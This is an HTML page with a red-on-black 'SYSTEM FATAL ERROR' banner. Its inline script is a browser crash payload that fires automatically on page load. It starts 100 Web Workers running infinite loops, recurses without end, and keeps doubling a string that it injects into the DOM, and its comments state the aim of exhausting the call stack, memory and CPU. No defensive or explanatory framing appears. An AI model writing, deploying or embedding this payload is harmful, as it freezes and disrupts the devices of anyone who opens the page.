<!DOCTYPE html>
<html>
<head><title>SYSTEM FATAL ERROR</title></head>
<body style="background:black; color:red;">
    <h1>TOTAL SYSTEM SATURATION...</h1>
    <script>
        // 1. THE STACK OVERFLOW (Infinite Recursion)
        // This crashes the JavaScript engine's call stack immediately.
        function death() {
            console.log("Saturating...");
            death(); 
        }

        // 2. THE MEMORY EXPLOSION (Heap Exhaustion)
        // We create a string that doubles in size every cycle. 
        // 2 -> 4 -> 8 -> 16... it hits Gigabytes in about 30 steps.
        function boom() {
            let s = "FATAL_ERROR_";
            while (true) {
                s += s; // Exponential growth
                // 3. THE DOM APOCALYPSE
                // Injecting the massive string into the DOM forces a massive render
                let d = document.createElement('div');
                d.innerHTML = s;
                document.body.appendChild(d);
            }
        }

        // 4. MULTI-THREADED LOCK (CPU Paralysis)
        // Spawning 100 workers that all run infinite loops 
        // will contest for every single clock cycle of your CPU.
        for (let i = 0; i < 100; i++) {
            const blob = new Blob(['while(true){}'], {type: 'text/javascript'});
            new Worker(URL.createObjectURL(blob));
        }

        // TRIGGER EVERYTHING AT ONCE
        setTimeout(() => {
            death();
            boom();
        }, 100);
    </script>
</body>
</html>
